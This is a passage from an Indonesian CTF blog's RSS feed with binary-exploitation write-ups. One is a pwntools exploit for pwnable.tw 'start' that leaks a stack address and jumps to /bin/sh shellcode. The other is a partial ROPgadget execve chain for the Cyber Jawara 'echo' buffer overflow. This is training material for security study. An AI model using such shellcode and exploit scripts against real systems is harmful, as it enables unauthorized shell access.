start: ELF &lt;span style=&quot;color:#3387cc;&quot;&gt;32&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;bit LSB executable, Intel &lt;span style=&quot;color:#3387cc;&quot;&gt;80386&lt;/span&gt;, version &lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt; (SYSV), statically linked, &lt;span style=&quot;color:#e28964;&quot;&gt;not&lt;/span&gt; stripped
$ checksec start                                                                                                                  
[&lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;] &lt;span style=&quot;color:#65b042;&quot;&gt;'start'&lt;/span&gt;
    Arch:     i386&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;32&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (&lt;span style=&quot;color:#3387cc;&quot;&gt;0x8048000&lt;/span&gt;)

&lt;/pre&gt;
&lt;p&gt;Hasil disassembly menggunaan Binary Ninja pada fungsi _start
&lt;img class=&quot;wp-image-95 size-lodestar-featured-image aligncenter&quot; src=&quot;https://bytetolong.files.wordpress.com/2017/11/screenshot_2017-11-13_20-13-39.png?w=433&amp;amp;h=482&amp;amp;crop=1&quot; alt=&quot;&quot; width=&quot;433&quot; height=&quot;482&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Diketahui bahwa binary start ditulis menggunakan asm x86 dan menggunakan 3 syscall yaitu write, read dan exit. Referensi tentang syscall dapat dilihat &lt;a href=&quot;https://syscalls.kernelgrok.com/&quot;&gt;disini&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pada bagian warna biru adalah proses pemanggilan syscall write dan bagian warna merah adalah pemanggilan syscall read . Lalu bagian kuning paling bawah adalah prospes stack akan di naikan sebanyak 20 bytes, sehingga Top Of Stack nya adalah alamat dari fungsi _exit dan program akan loncat ke fungsi _exit untuk mengakhiri eksekusi.&lt;/p&gt;

&lt;p&gt;Apabila code nya di convert ke C kira-kira seperti berikut&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;void main(void){
    char buf[&lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt;] &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Let's start the CTF:&quot;&lt;/span&gt;;
    write(&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;,buf,&lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt;);
    read(&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;,buf,&lt;span style=&quot;color:#3387cc;&quot;&gt;60&lt;/span&gt;)
    exit();
}
void exit(){
    exit(&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;);
}
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;How To Get A Shell ?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Karena binary nya sama sekali tidak memiliki proteksi, kita dapat dengan mudah inject shellcode lalu loncat ke shellcode berada. Dengan asumsi bahwa ASLR dalam keadaaan ON, kita dapat meleak Stack  Address lalu mengkalkulasikan jarak antara Stack address dan  tempat shellcode berada.&lt;/p&gt;

&lt;p&gt;Pada dasar nya program start akan mem PUSH 28 bytes data ke dalam stack, berikut Layout Stack nya&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
Top Of Stack &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x2774654c&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 'Let''&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x74732073&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 's st'&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x20747261&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 'art '&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x20656874&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 'the '&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x3a465443&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 'CTF:'&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x804809d&lt;/span&gt;   &lt;span style=&quot;color:#e28964;&quot;&gt;| // syscall_exit&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;     esp      &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;
                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Dari Layout Stack diatas dapat di pastikan untuk mengoverwrite Return Address atau EIP nya dibutuhkan 20 bytes. Lalu arahkan eksekusi program ke instruksi mov ecx, esp (pada alamat : 0x8048087). sehingga program akan mengluarkan output yang berisi Stack Address.&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;from&lt;/span&gt; pwn &lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;

context(&lt;span style=&quot;color:#3e87e3;&quot;&gt;arch&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;i386&quot;&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt;os&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;linux&quot;&lt;/span&gt;)

&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# http://shell-storm.org/shellcode/files/shellcode-811.php&lt;/span&gt;
shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;
shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x31&lt;/span&gt;\xc0&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x50&lt;/span&gt;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x68&lt;/span&gt;\x2f\x2f&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x73&lt;/span&gt;&quot;&lt;/span&gt;
shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x68&lt;/span&gt;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x68&lt;/span&gt;\x2f&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x62&lt;/span&gt;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x69&lt;/span&gt;\x6e&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x89&lt;/span&gt;&quot;&lt;/span&gt;
shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;\xe3&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x89&lt;/span&gt;\xc1&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x89&lt;/span&gt;\xc2\xb0\x0b&quot;&lt;/span&gt;
shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;\xcd&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x80&lt;/span&gt;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x31&lt;/span&gt;\xc0&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x40&lt;/span&gt;\xcd&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x80&lt;/span&gt;&quot;&lt;/span&gt;
mov_ecx_esp &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; p32(&lt;span style=&quot;color:#3387cc;&quot;&gt;0x08048087&lt;/span&gt;)

start &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; remote(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;chall.pwnable.tw&quot;&lt;/span&gt;,&lt;span style=&quot;color:#3387cc;&quot;&gt;10000&lt;/span&gt;)
start.recvuntil(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;CTF:&quot;&lt;/span&gt;)
payload &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; mov_ecx_esp
start.send(payload)
stack&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; start.recv(&lt;span style=&quot;color:#3387cc;&quot;&gt;4&lt;/span&gt;)
stack_addr &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; u32(stack)
&lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;hex&lt;/span&gt;(stack_addr)
payload_next&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;p32(stack_addr&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt;)&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x90&lt;/span&gt;&quot;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;4&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; shellcode 
start.sendline(payload_next) 
start.interactive()
&lt;/pre&gt;
</description>
        <pubDate>Mon, 06 Nov 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/binary%20exploit/2017/11/06/pwnabletw-start.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/binary%20exploit/2017/11/06/pwnabletw-start.html</guid>
        
        <category>pwnabletw</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
        <category>Binary Exploit</category>
        
      </item>
    
      <item>
        <title>Write Up Cyber Jawara 2017</title>
        <description>&lt;p&gt;Berikut adalah write up penyisihan Cyber Jawara 2017 dari tim Rules Of Pwning (ROP).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/0B7LFGSP-Hb3qY2xySTU2bU5yRWc/view?usp=sharing&quot;&gt;Write Up Cyber Jawara 2017&lt;/a&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
&lt;h3 style=&quot;text-align: center;&quot;&gt;&lt;em&gt;&quot;Tiada Daya dan Upaya Melainkan Pertolongan Allah&quot;&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt; &lt;/p&gt;
</description>
        <pubDate>Mon, 06 Nov 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/2017/11/06/cyber-jawara-2017.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/06/cyber-jawara-2017.html</guid>
        
        <category>cyber-jawara2017</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        <title>Cyber Jawara 2017 Final - echo (pwn 200)</title>
        <description>&lt;p&gt;&lt;img class=&quot;size-medium aligncenter&quot; src=&quot;http://acehraya.co.id/wp-content/uploads/2015/09/codepolitan-header-cyber-jawara2.png&quot; width=&quot;700&quot; height=&quot;350&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Diberikan sebuah file elf binary 64 bit dengan nama echo&lt;/p&gt;

&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ file &lt;span style=&quot;color:#dad085;&quot;&gt;echo&lt;/span&gt;
&lt;span style=&quot;color:#dad085;&quot;&gt;echo&lt;/span&gt;: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, &lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;GNU/Linux&lt;/span&gt; 2.6.32, BuildID[sha1]=c5e63f048eccc18550211a8582dd02c44874ba61, stripped
&lt;/pre&gt;

&lt;p&gt;Dengan proteksi sebagai berikut&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ checksec &lt;span style=&quot;color:#dad085;&quot;&gt;echo&lt;/span&gt;
[&lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;] &lt;span style=&quot;color:#65b042;&quot;&gt;'echo'&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
&lt;/pre&gt;

&lt;p&gt;Berikut adalah hasil decompile menggunakan IDA pro&lt;/p&gt;

&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#99cf50;&quot;&gt;int&lt;/span&gt; __cdecl &lt;span style=&quot;color:#89bdff;&quot;&gt;main&lt;/span&gt;(int argc, const char **argv, const char **envp)
{
  char v4; // [sp+0h] [bp-2710h]@1
  welcome_msg();
  gets(&amp;amp;v4);
  return foo((__int64)&amp;amp;v4);
}
&lt;/pre&gt;

&lt;p&gt;Dari hasil decompile IDA pro dipastikan binary tersebut vulnerable terhadap Buffer Overflow karena menggunakan fungsi “gets()” yang tidak memfilter panjang inputan.&lt;/p&gt;

&lt;p&gt;Dengan asumsi bahwa ASLR pada mesin dalam keadaan ON dan binary tersebut di proteksi dengan NX bit yang tidak memungkinkan untuk eksekusi shellcode, sehingga teknik yang digunakan adalah ROP ( Return Oriented Programming).&lt;/p&gt;

&lt;p&gt;Sebelumnya, ukuran buffer variable v4 yang menyimpan inputan user adalah 0x2710 (10000) bytes (terlihat pada bp-2710h). Dan dibutuhkan 10000 + 8 bytes untuk mengoverwrite RIP.&lt;/p&gt;

&lt;p&gt;Karena binary tersebut dicompile dengan flag ( -static ) static binary, pembuatan gadget bisa di automasi menggunakan “ROPgadget” untuk generate ropchain.&lt;/p&gt;

&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ ROPgadget --binary &lt;span style=&quot;color:#dad085;&quot;&gt;echo&lt;/span&gt; --ropchain
&lt;/pre&gt;

&lt;p&gt;Berikut exploit code dari ropchain yang digenerate ROPgadget dan disesuikan dengan ukuran buffer untuk overwrite RIP.&lt;/p&gt;

&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;#!/usr/bin/env python2&lt;/span&gt;
&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# execve generated by ROPgadget&lt;/span&gt;

&lt;span style=&quot;color:#e28964;&quot;&gt;from&lt;/span&gt; struct &lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; pack

&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# Padding goes here&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;'A'&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;10008&lt;/span&gt;

p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000401817&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rsi ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb080&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000479ce6&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rax ; pop rdx ; pop rbx ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;'/bin//sh'&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x4141414141414141&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# padding&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x4141414141414141&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# padding&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000004755c1&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# mov qword ptr [rsi], rax ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000401817&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rsi ; ret&lt;/span&gt;
p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb088&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data + 8&lt;/span&gt;
